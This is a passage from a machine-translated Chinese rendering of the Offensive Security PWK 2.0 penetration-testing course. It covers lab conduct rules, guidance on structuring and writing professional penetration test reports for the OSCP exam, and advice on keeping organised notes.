<div style="position:absolute;top:30099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 请勿更改 network-secret.txt 或 proof.txt 文件的内容。</font></font></nobr></div>
<div style="position:absolute;top:30127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 不要故意打扰在实验室工作的其他学生。</font><font style="vertical-align: inherit;">这包括但</font></font></nobr></div>
<div style="position:absolute;top:30147;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不限于：</font></font></nobr></div>
<div style="position:absolute;top:30175;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 关闭机器</font></font></nobr></div>
<div style="position:absolute;top:30204;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将用户踢出机器</font></font></nobr></div>
<div style="position:absolute;top:30232;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 阻止特定的 IP 地址或范围</font></font></nobr></div>
<div style="position:absolute;top:30260;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 入侵其他学生的客户端或 Kali 机器</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:30297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8 报告</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告通常被视为渗透测试的必要之恶。</font><font style="vertical-align: inherit;">可悲的是，许多高技术</font></font></nobr></div>
<div style="position:absolute;top:30358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聪明的渗透测试人员并没有给予它应有的关注，而是一个写得很好的和</font></font></nobr></div>
<div style="position:absolute;top:30378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来专业的报告有时会比写得不好的报告获得更多的积极关注，但</font></font></nobr></div>
<div style="position:absolute;top:30397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术娴熟的对手。</font></font></nobr></div>
<div style="position:absolute;top:30430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于撰写报告是任何渗透测试的一部分，并且因为它是 OSCP 考试的一部分，我们</font></font></nobr></div>
<div style="position:absolute;top:30449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">想在接近课程材料之前花点时间谈谈报告写作。</font></font></nobr></div>
<div style="position:absolute;top:30469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们希望现在查看这些指南将帮助您考虑如何解释</font></font></nobr></div>
<div style="position:absolute;top:30488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试的操作、结果和结果。</font></font></nobr></div>
<div style="position:absolute;top:30521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有许多不同的报告撰写方法，我们不会声称进攻性安全</font></font></nobr></div>
<div style="position:absolute;top:30540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">样例报告</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝对是撰写报告的最佳方式。</font><font style="vertical-align: inherit;">如果这个例子有帮助，请随意使用</font></font></nobr></div>
<div style="position:absolute;top:30560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它。</font><font style="vertical-align: inherit;">如果没有，请随时更改设计或创建其他更适合您的设计。</font></font></nobr></div>
<div style="position:absolute;top:30592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们认为在撰写报告时需要牢记一些一般准则。</font></font></nobr></div>
<div style="position:absolute;top:30612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些指南没有按特定顺序列出，因为它们都同样重要。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:30646;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.1 考虑目标</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑评估的目标。</font><font style="vertical-align: inherit;">你打算完成什么？</font><font style="vertical-align: inherit;">有没有</font></font></nobr></div>
<div style="position:absolute;top:30703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您希望在报告中做出单一、具体的陈述？</font><font style="vertical-align: inherit;">许多缺乏经验的渗透测试人员</font></font></nobr></div>
<div style="position:absolute;top:30723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">深入了解评估的技术方面以及完成评估所需的技能，</font></font></nobr></div>
<div style="position:absolute;top:30742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但渗透测试从来都不是简单炫耀的机会。</font><font style="vertical-align: inherit;">牢记最初的目标</font></font></nobr></div>
<div style="position:absolute;top:30762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当您开始撰写报告时。</font></font></nobr></div>
<div style="position:absolute;top:30794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织您的内容以构建一份最能引起受众共鸣的报告。</font><font style="vertical-align: inherit;">我们高度</font></font></nobr></div>
<div style="position:absolute;top:30813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议在开始之前写一个大纲。</font><font style="vertical-align: inherit;">您可以通过创建部分来快速轻松地完成此操作</font></font></nobr></div>
<div style="position:absolute;top:30833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题，没有实际内容或解释。</font><font style="vertical-align: inherit;">这将帮助您避免重复自己或</font></font></nobr></div>
<div style="position:absolute;top:30852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遗漏关键信息。</font><font style="vertical-align: inherit;">它还可以帮助您更轻松地克服可怕的“作家障碍”。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:30935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.offensive-security.com/reports/sample-penetration-testing-report.pdf</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:31063;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:31096;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:32173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:32173;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:32173;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31192;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.2 考虑观众</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑谁将阅读您在报告中包含的信息并采取行动。</font><font style="vertical-align: inherit;">什么</font></font></nobr></div>
<div style="position:absolute;top:31249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的观众希望从中学习吗？</font><font style="vertical-align: inherit;">他们是谁？</font><font style="vertical-align: inherit;">在大多数情况下，人们有着截然不同的</font></font></nobr></div>
<div style="position:absolute;top:31268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术知识水平将阅读您的报告。</font><font style="vertical-align: inherit;">尝试写一些东西来满足每个潜力</font></font></nobr></div>
<div style="position:absolute;top:31288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告的读者。</font><font style="vertical-align: inherit;">实际上，这意味着将您的报告分成几个部分来解决</font></font></nobr></div>
<div style="position:absolute;top:31307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同受众的需求。</font></font></nobr></div>
<div style="position:absolute;top:31340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们花点时间多谈谈观众。</font></font></nobr></div>
<div style="position:absolute;top:31373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可能希望公司的高级管理人员阅读报告的某些部分。</font><font style="vertical-align: inherit;">多数情况</font></font></nobr></div>
<div style="position:absolute;top:31392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些高管没有时间或不想阅读所有高度技术性的细节</font></font></nobr></div>
<div style="position:absolute;top:31411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击。</font><font style="vertical-align: inherit;">因此，大多数报告都以执行摘要开头。</font><font style="vertical-align: inherit;">执行摘要</font></font></nobr></div>
<div style="position:absolute;top:31431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该是一个简短的（不超过两页），对结果和客户的高层次解释</font></font></nobr></div>
<div style="position:absolute;top:31450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">整体安全态势。</font><font style="vertical-align: inherit;">由于这可能是他们唯一会阅读的部分，因此请确保您对此进行定制</font></font></nobr></div>
<div style="position:absolute;top:31470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分和专门针对高管的语言。</font></font></nobr></div>
<div style="position:absolute;top:31502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还将有一个由更多技术专业人员组成的团队，他们将更详细地阅读您的报告。</font></font></nobr></div>
<div style="position:absolute;top:31522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告的其余部分应该迎合他们，并将包括你所看到的大屠杀的所有血腥细节</font></font></nobr></div>
<div style="position:absolute;top:31541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对目标网络造成影响。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31575;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.3 考虑要包含的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更具体地说，考虑什么不包括是有帮助的。</font><font style="vertical-align: inherit;">请记住，您的读者会</font></font></nobr></div>
<div style="position:absolute;top:31633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">想要解决您发现的问题，因此您包含的所有内容都应该是相关的</font></font></nobr></div>
<div style="position:absolute;top:31652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且有意义。</font><font style="vertical-align: inherit;">一份包含过多无关紧要信息的臃肿报告只会让</font></font></nobr></div>
<div style="position:absolute;top:31671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读者难以阅读和理解。</font><font style="vertical-align: inherit;">不要包括填充材料只是为了制作</font></font></nobr></div>
<div style="position:absolute;top:31691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告看长了。</font></font></nobr></div>
<div style="position:absolute;top:31724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下是关于包含哪些内容和不包含哪些内容的四个快速提示：</font></font></nobr></div>
<div style="position:absolute;top:31757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 不要在您的报告中包含一页又一页的工具输出，除非它绝对是</font></font></nobr></div>
<div style="position:absolute;top:31776;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关的。</font><font style="vertical-align: inherit;">考虑 Nmap 的输出。</font><font style="vertical-align: inherit;">您没有理由包含每一行</font></font></nobr></div>
<div style="position:absolute;top:31795;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从报告中的输出中删除，因为它不会增加任何价值。</font><font style="vertical-align: inherit;">如果你有一个观点</font></font></nobr></div>
<div style="position:absolute;top:31815;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，您正在尝试制作大量 SNMP 服务</font></font></nobr></div>
<div style="position:absolute;top:31834;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可公开访问的主机，然后使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–oG</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志并仅 grep 出那些打开</font></font></nobr></div>
<div style="position:absolute;top:31853;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP 端口。</font></font></nobr></div>
<div style="position:absolute;top:31888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 明智地使用屏幕截图。</font><font style="vertical-align: inherit;">同样的规则适用于您的其余内容</font></font></nobr></div>
<div style="position:absolute;top:31907;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加到您的报告中。</font><font style="vertical-align: inherit;">使用屏幕截图来说明问题，而不仅仅是展示出色的meterpreter</font></font></nobr></div>
<div style="position:absolute;top:31926;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出。</font><font style="vertical-align: inherit;">例如，假设您在 Linux 主机上获得了 root 权限。</font><font style="vertical-align: inherit;">而不是显示 15 个屏幕截图</font></font></nobr></div>
<div style="position:absolute;top:31946;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只有 root 用户可以访问的各种目录列表，只需包含一个屏幕截图</font></font></nobr></div>
<div style="position:absolute;top:31965;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WHOAMI</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令输出。</font><font style="vertical-align: inherit;">精通技术的读者可能只需要这一件事</font></font></nobr></div>
<div style="position:absolute;top:31985;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解您已取得的成就。</font></font></nobr></div>
<div style="position:absolute;top:32019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 包括额外的材料作为额外的证明文件。</font><font style="vertical-align: inherit;">如果你有内容</font></font></nobr></div>
<div style="position:absolute;top:32038;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提高页数，但不会引起整个观众的兴趣，请考虑提供</font></font></nobr></div>
<div style="position:absolute;top:32057;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除报告外的其他支持文件。</font><font style="vertical-align: inherit;">有需要的读者</font></font></nobr></div>
<div style="position:absolute;top:32077;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息仍然可以检查支持文件和报告的质量</font></font></nobr></div>
<div style="position:absolute;top:32096;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会受苦。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:32251;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32284;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:33361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:33361;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:33361;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 也许最重要的是，回顾评估的目标。</font><font style="vertical-align: inherit;">想想</font></font></nobr></div>
<div style="position:absolute;top:32399;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你试图提出的观点与目标以及每一部分如何</font></font></nobr></div>
<div style="position:absolute;top:32418;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息将或不会加强这一点。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32453;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.4 考虑演示</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容的呈现与内容本身一样重要。</font><font style="vertical-align: inherit;">最重要的是，一个命令</font></font></nobr></div>
<div style="position:absolute;top:32510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言绝对是关键。</font><font style="vertical-align: inherit;">虽然我们知道对于我们的许多学生来说，英语不是</font></font></nobr></div>
<div style="position:absolute;top:32530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们的母语，尝试写出流畅流畅的连贯句子仍然很重要</font></font></nobr></div>
<div style="position:absolute;top:32549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">逻辑上。</font><font style="vertical-align: inherit;">在这种情况下，重要的是要“努力”并尽力而为，专注于得分</font></font></nobr></div>
<div style="position:absolute;top:32568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单易懂。</font></font></nobr></div>
<div style="position:absolute;top:32601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，您可能需要记住以下几点：</font></font></nobr></div>
<div style="position:absolute;top:32634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 保持一致。</font><font style="vertical-align: inherit;">注意间距、标题样式、字体等方面的不一致</font></font></nobr></div>
<div style="position:absolute;top:32653;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择等等。</font><font style="vertical-align: inherit;">未对齐和不一致的段落或标题看起来不专业</font></font></nobr></div>
<div style="position:absolute;top:32672;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和马虎。</font></font></nobr></div>
<div style="position:absolute;top:32707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.拼写检查，拼写检查，拼写检查！</font><font style="vertical-align: inherit;">这是不言自明的。</font><font style="vertical-align: inherit;">他们的 != 那里，你的 !=</font></font></nobr></div>
<div style="position:absolute;top:32726;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你是</font></font></nobr></div>
<div style="position:absolute;top:32761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些提示应该让您大致了解如何编写具有专业外观和连贯性的文章</font></font></nobr></div>
<div style="position:absolute;top:32780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清楚传达预期信息的报告。</font><font style="vertical-align: inherit;">最终，报告就是您的产品</font></font></nobr></div>
<div style="position:absolute;top:32799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交付给客户。</font><font style="vertical-align: inherit;">确保它以正确和专业的方式代表您和您的工作。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32834;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.5 PWK 报告</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成课程实验室指南和视频后，您将进行全面的</font></font></nobr></div>
<div style="position:absolute;top:32891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的内部 VPN 实验室网络中进行渗透测试。</font><font style="vertical-align: inherit;">报告这种做法不是强制性的</font></font></nobr></div>
<div style="position:absolute;top:32910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试，但作为练习重要技能的有用方式，它可能对您有益</font></font></nobr></div>
<div style="position:absolute;top:32930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您将在整个职业生涯中使用。</font></font></nobr></div>
<div style="position:absolute;top:32963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您选择撰写并提交实验报告，则需要记录课程练习</font></font></nobr></div>
<div style="position:absolute;top:32982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除非另有说明，否则贯穿本实验指南。</font><font style="vertical-align: inherit;">您可以将这些作为附录添加到最终</font></font></nobr></div>
<div style="position:absolute;top:33001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您将在完成认证考试后提交的报告。</font></font></nobr></div>
<div style="position:absolute;top:33034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最终文档应作为正式的渗透测试报告提交。</font><font style="vertical-align: inherit;">你的报告</font></font></nobr></div>
<div style="position:absolute;top:33053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应包括执行摘要，以及所有机器的详细纲要（不包括</font></font></nobr></div>
<div style="position:absolute;top:33073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的专用客户端计算机）。</font><font style="vertical-align: inherit;">有关报告要求的详细信息</font></font></nobr></div>
<div style="position:absolute;top:33092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然，我们的支持网站上提供了包括模板和示例报告的内容。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10</font></font></font></nobr></div>
<div style="position:absolute;top:33125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了可选的 VPN 实验室网络渗透测试报告，选择 OSCP 的学生</font></font></nobr></div>
<div style="position:absolute;top:33144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">认证必须提交考试渗透测试报告。</font><font style="vertical-align: inherit;">该报告应清楚地表明</font></font></nobr></div>
<div style="position:absolute;top:33164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们如何成功实现认证考试目标。</font><font style="vertical-align: inherit;">必须发送此最终报告</font></font></nobr></div>
<div style="position:absolute;top:33183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成后不超过 24 小时以 PDF 格式返回到我们的认证委员会</font></font></nobr></div>
<div style="position:absolute;top:33202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">认证考试。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:33311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com/pwk-network-intro-guide/#reporting</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:33439;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33472;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:34549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:34549;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:34549;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计划在通过 OSCP 认证考试之前申请 CPE 学分的学生将</font></font></nobr></div>
<div style="position:absolute;top:33587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要编写并提交内部VPN实验室网络的报告并包括课程练习</font></font></nobr></div>
<div style="position:absolute;top:33606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为附录。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33641;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.6 做笔记</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息是关键，因此记下并保持有条理的笔记至关重要。</font><font style="vertical-align: inherit;">这适用于 PWK 课程，</font></font></nobr></div>
<div style="position:absolute;top:33698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相应的 OSCP 考试，甚至一般的渗透测试。</font></font></nobr></div>
<div style="position:absolute;top:33731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">笔记中的详细程度由您决定。</font><font style="vertical-align: inherit;">我们建议您记录一切以开始</font></font></nobr></div>
<div style="position:absolute;top:33750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和。</font><font style="vertical-align: inherit;">这包括所有控制台输出，以及关键事件的屏幕截图。</font><font style="vertical-align: inherit;">最好有</font></font></nobr></div>
<div style="position:absolute;top:33770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">太多了，而不是为了填补空白而重复材料。</font></font></nobr></div>
<div style="position:absolute;top:33803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从一开始就组织起来会得到长期回报。</font><font style="vertical-align: inherit;">如果您需要返回到您的笔记</font></font></nobr></div>
<div style="position:absolute;top:33822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在几周、几个月甚至几年内的任何原因，组织将使您能够快速找到</font></font></nobr></div>
<div style="position:absolute;top:33841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您需要的信息。</font><font style="vertical-align: inherit;">培养良好的文档技能还可以让您快速发现</font></font></nobr></div>
<div style="position:absolute;top:33860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几天前你用来利用给定机器的长命令，如果你需要的话</font></font></nobr></div>
<div style="position:absolute;top:33880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新利用它，或在成功后的后利用期间交叉引用用户</font></font></nobr></div>
<div style="position:absolute;top:33899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破坏了每台目标机器。</font></font></nobr></div>
<div style="position:absolute;top:33932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着时间的推移，您将开始为您的笔记生成粗略的模板和格式。</font><font style="vertical-align: inherit;">结果，您的</font></font></nobr></div>
<div style="position:absolute;top:33951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程开始和结束时笔记的布局和细节会有所不同。</font><font style="vertical-align: inherit;">对我们来说很常见</font></font></nobr></div>
<div style="position:absolute;top:33971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听到学生评论他们在多大程度上缺少某些信息</font></font></nobr></div>
<div style="position:absolute;top:33990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始，以及他们如何回到“早期目标”来收集它。</font></font></nobr></div>
